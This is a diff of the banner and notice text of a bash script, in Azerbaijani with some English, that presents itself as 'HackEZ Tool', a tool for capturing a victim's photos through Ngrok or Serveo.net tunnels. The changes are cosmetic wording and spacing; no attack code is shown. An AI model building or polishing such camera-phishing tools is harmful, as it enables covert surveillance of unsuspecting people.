@@ -17,10 +17,10 @@ banner() {
 
 echo '
 ┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-│HACKEZ Tool-a xos gelmisiniz :)                                                                                                               │
-│Ngrok ve Serveo.net(local host) istifade ederek victim-in fotolarinin alinmasi aleti                                                                                                           │Termux ve Arch Linuxta test edilmisdir
+│HackEZ Tool-a xos gelmisiniz :)                                                                                               │
+│Ngrok ve Serveo.net(local host) istifade edilerek victim fotolarinin alinmasi aleti                                                                                                           │Termux ve Arch Linuxta test edilmisdir
 │Made in Azerbaijan
-│                                                                                                                                                 HEXATRONN :)     │
+│                                                                                                             HEXATRONN :)     │
 └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── '
 
 
@@ -32,7 +32,7 @@ printf "          \e[1;77m v1.1 This reborn script by { hexatronn }\e[0m \n"
 printf "\n"
 
 
-echo "      N073:> XAHIS EDIRIK HOTSPOT AKTIV OLARAQ QALSIN EKS HALDA LINK GENERASIYA OLUNMAYACAQ (PLEASE TURN ON YOUR HOTSPOT
+echo "      N073:> XAHIS EDIRIK HOTSPOT VE SEBEKE AKTIV OLARAQ QALSIN, EKS HALDA LINK GENERASIYA OLUNMAYACAQ (PLEASE TURN ON YOUR HOTSPOT AND WIFI
                    OR ELSE YOU DONT GET LINK....!)"
 
 
